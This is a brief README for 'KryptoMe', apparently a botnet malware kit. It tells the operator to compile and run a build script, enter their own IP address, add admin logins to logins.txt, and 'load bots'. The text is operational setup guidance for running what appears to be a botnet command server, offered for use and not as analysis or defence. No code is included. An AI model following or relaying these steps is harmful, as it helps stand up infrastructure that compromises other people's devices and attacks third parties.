KryptoMe made by korpze and daddyl33t
to setup follow all the below steps/instructions

1. upload all files
2. RUN [gcc -obuild build.c; ./build]
3. when asked put in your ip address . by .
4. type y for everything
5. add login to logins.txt (user:pass:admin:-1)
6. load bots